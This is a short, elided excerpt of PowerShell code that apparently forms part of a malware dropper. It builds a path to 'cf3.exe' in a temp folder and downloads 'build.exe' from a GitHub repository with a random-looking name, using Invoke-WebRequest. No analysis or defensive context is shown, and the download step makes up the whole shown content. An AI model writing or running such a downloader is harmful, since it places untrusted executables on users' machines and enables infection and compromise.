...
$output = [IO.Path]::GetFullPath((Join-Path $OriginalTemp "cf3.exe"))
...
try {
    ...
    Invoke-WebRequest -Uri 'https://github.com/ct7ybve7f387/tests/raw/refs/heads/main/build.exe' -OutFile $resolvedPath
